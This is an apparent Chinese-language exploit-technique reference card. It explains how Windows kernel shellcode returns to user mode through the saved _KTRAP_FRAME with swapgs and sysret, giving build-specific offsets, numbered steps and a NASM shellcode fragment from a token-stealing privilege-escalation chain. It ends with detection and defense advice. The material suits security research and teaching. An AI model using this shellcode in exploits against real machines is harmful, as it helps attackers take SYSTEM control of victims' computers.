---
id: binary-pwn-kernel-windows-kernel-shellcode-return-trapframe-swapgs-sysret
title: 内核 shellcode 干净返回用户态：修 KernelApcDisable，从 _KTRAP_FRAME 恢复 Rip/Rsp 后 swapgs + sysret
type: scenario
domain: binary
path: binary/pwn/kernel
technique: windows-kernel-shellcode-return-ktrapframe-swapgs-sysret
tags:
- windows
- kernel
- pwn
- shellcode
- ktrap-frame
- swapgs
- sysret
- return-to-user
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V594
  verified_at: '2026-11-12T15:35:48+08:00'
  notes: 已对照原文及截图核对：KTHREAD+0x90 TrapFrame、KernelApcDisable +0x1E4 调试值 0n-1 经 inc cx 归零、_KTRAP_FRAME Rbp+0x158/Rip+0x168/EFlags+0x178/Rsp+0x180、Rip 指向 ntdll!NtDeviceIoControlFile+0x14(ret)、xor eax,eax;swapgs;o64 sysret 序列均与图 26-28 和原文一致；图 50 最终 shellcode 含该片段且执行成功。与 token-steal 卡仅一条要点重叠，独立返回技术卡成立。未复跑。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-windows-kernel-shellcode-return-trapframe-swapgs-sysret/
draft: false
kb_aliases:
- KTRAP_FRAME 返回
- KernelApcDisable 修复
- swapgs sysret 内核 shellcode
- 内核 shellcode 返回用户态
- TrapFrame Rip Rsp 恢复
- o64 sysret
---

## 一句话结论

当内核 shellcode 经过多段 ROP/函数调用、栈已无法用 `add rsp; ret` 收拾时，从 `gs:[0x188]` 的 `_KTHREAD` 取 `TrapFrame`，恢复用户态 `Rip/Rsp/Rbp/EFlags`，把 `KernelApcDisable` 加 1 归零，再执行 `swapgs; sysret`，让被劫持的线程像系统调用正常返回一样回到 ntdll（`NtDeviceIoControlFile` 的下一条指令）继续执行。

## 原理

- **系统调用进入时保存的上下文**：x64 Windows 在 `syscall` 进入内核时，把用户态 `Rip/CS/EFlags/Rsp/SS` 等保存到当前线程内核栈上的 `_KTRAP_FRAME`；`_KTHREAD` 中有指向它的指针（案例构建 `KTHREAD+0x90`）。用户态 `Rip` 等内容位于 `_KTRAP_FRAME` 的固定偏移（案例：`Rbp +0x158`、`Rip +0x168`、`EFlags +0x178`、`Rsp +0x180`）。
- **sysret 的寄存器约定**：`sysret` 从 `RCX` 取目标 `Rip`、从 `R11` 取 `RFLAGS`，并按 MSR 恢复 `CS/SS`；返回用户态前必须先 `swapgs` 把 GS 基址切回用户 GS，否则用户态的 TLS/GS 访问全部错乱。
- **为什么要走 TrapFrame 而不是 `add rsp; ret`**：栈溢出 ROP 再叠加 `ExAllocatePoolWithTag`、`RtlCopyMemory` 等多函数调用后，`rsp` 相对原驱动栈帧的偏移已被多次 push/pop 破坏，很难精确还原；而 `_KTRAP_FRAME` 中保存的是进入内核时 CPU 自动写入的原始用户上下文，与栈现状无关，直接恢复最稳。
- **返回点是什么**：被劫持系统调用的用户态返回地址已存在 `TrapFrame.Rip` 中（案例为 `ntdll!NtDeviceIoControlFile+0x14`，即 `syscall` 之后那条 `ret`）。恢复到该地址相当于把这次 `DeviceIoControl` 当作成功返回，用户态 Exp 继续往下跑（例如启动 `cmd.exe`）。
- **KernelApcDisable 平衡**：内核进入/退出路径会维护 `_KTHREAD+0x1E4` 的 `KernelApcDisable` 计数（16 位）。绕过正常退出路径时该计数不会自动恢复；参考 shellcode 在调试中读到 `0n-1`，执行 `inc cx` 使其归零，避免返回用户态后 APC 投递/线程挂起行为异常。
- **IRQL 前提**：该返回方式只适用于 `PASSIVE_LEVEL` 的普通系统调用/IOCTL 上下文；若 shellcode 运行在提升的 IRQL（如 DPC），`sysret` 与用户态恢复都不合法。

## 触发条件

- 已在当前线程的系统调用上下文中取得 ring0 代码执行（栈溢出 ROP、池中 shellcode 等），且 `gs:[0x188]` 指向当前 `_KTHREAD`。
- 目标构建的偏移已知：`KTHREAD.TrapFrame +0x90`、`_KTRAP_FRAME` 中各寄存器偏移、`KernelApcDisable +0x1E4`（案例为 Windows 10 19045.2006）；不同版本必须重新确认。
- 线程处于 `PASSIVE_LEVEL`、未持有会影响返回的内核资源（自旋锁、APC 禁用区等）；否则应改回正常内核退出路径。
- 若 shellcode 只是简单栈溢出后的单段跳转，能精确计算 `add rsp; retn` 时，优先用更简单的栈修补返回。

## 利用步骤

1. 在 shellcode 结尾 `mov rax, gs:[0x188]` 取 `_KTHREAD`。
2. 调整 APC 计数：`mov cx, [rax+0x1E4]; inc cx; mov [rax+0x1E4], cx`。
3. 取 `TrapFrame`：`mov rdx, [rax+0x90]`，然后依次 `mov rcx, [rdx+0x168]`（用户 Rip）、`mov r11, [rdx+0x178]`（EFlags）、`mov rsp, [rdx+0x180]`（用户 Rsp）、`mov rbp, [rdx+0x158]`（Rbp）。
4. `xor eax, eax`（清零返回状态/通用寄存器），`swapgs` 切回用户 GS，`sysret`（NASM 中用 `o64 sysret` 强制 64 位编码）。
5. 控制流回到 ntdll 中系统调用返回点，Exp 进程继续运行；随后验证 `whoami`/`whoami /priv`。
6. 调试核对：在 WinDbg 中对 `_KTRAP_FRAME` 的 `Rip` 反汇编，确认它指向 `ntdll!NtDeviceIoControlFile+0x14` 的 `ret`，说明返回点与调用点匹配。

## PoC

NASM（64 位）返回片段，偏移为案例构建值：

```nasm
    mov rax, gs:[0x188]         ; rax = 当前 _KTHREAD
    mov cx, [rax + 0x1E4]       ; KernelApcDisable（16 位）
    inc cx                      ; 调试时为 0n-1，加 1 归零
    mov [rax + 0x1E4], cx

    mov rdx, [rax + 0x90]       ; rdx = _KTRAP_FRAME
    mov rcx, [rdx + 0x168]      ; Rip     -> sysret 目标
    mov r11, [rdx + 0x178]      ; EFlags  -> sysret RFLAGS
    mov rsp, [rdx + 0x180]      ; 用户 Rsp
    mov rbp, [rdx + 0x158]      ; 用户 Rbp

    xor eax, eax
    swapgs
    o64 sysret                  ; NASM 中强制 64 位 sysret 编码
```

案例中该片段放入内核池 shellcode 末尾，配合 Token 窃取与特权开启，执行后用户态 `whoami` 返回 `nt authority\system`、`whoami /priv` 全部启用；未在本机复跑，偏移必须按目标 build 校正。

## 变体与关联

- 关联：[[binary-pwn-kernel-windows-kvas-nonpaged-pool-executable-shellcode-rop]]（栈不可精确恢复时，本卡是其首选收尾方式）。
- 关联：[[binary-pwn-kernel-windows-shellcode-token-steal-eprocess]]（简单上下文下仍用 `add rsp,0x10; retn`）。
- 关联：[[binary-pwn-kernel-windows-driver-stack-overflow-ioctl-ret-hijack]]（单段 ROP 场景，能算出栈偏移）。
- 变体：恢复上下文后不一定 `sysret`，也可用 `iretq` 构造完整 iret 帧返回用户态（需要同时处理 CS/SS/RFLAGS/RSP/RIP）。
- 变体：若目标是长期驻留/内核线程，可不返回用户态，改为设置事件或直接启动系统进程。
- 边界：`KTRAP_FRAME` 偏移随 build 变化；若 shellcode 在非当前线程上下文（如工作线程）执行，`gs:[0x188]` 指向的不是目标线程，需先切换或改用其它方式；提升的 IRQL、持有锁、APC 禁用区都会让直接返回崩溃。

## 检测与防御

- 检测：内核线程异常直接 `sysret` 的表现通常是用户态进程行为突变（系统调用返回值/寄存器异常）、EDR 对 `swapgs/sysret` 序列与内核栈篡改的监控；关注进程在异常内核调用后立即派生 SYSTEM 子进程。
- 系统侧：HVCI/内核 CFG、KVA Shadow、SMEP/SMAP 提高进入 ring0 的门槛；启用内核栈保护与崩溃转储分析。
- 驱动侧：消除栈溢出与可控返回地址，开启 /GS、CFG，减少 ROP/shellcode 入口。
- 应急：分析 BSOD/crash dump 中的栈与 `_KTRAP_FRAME` 异常，排查最近加载的驱动和 IOCTL 调用。
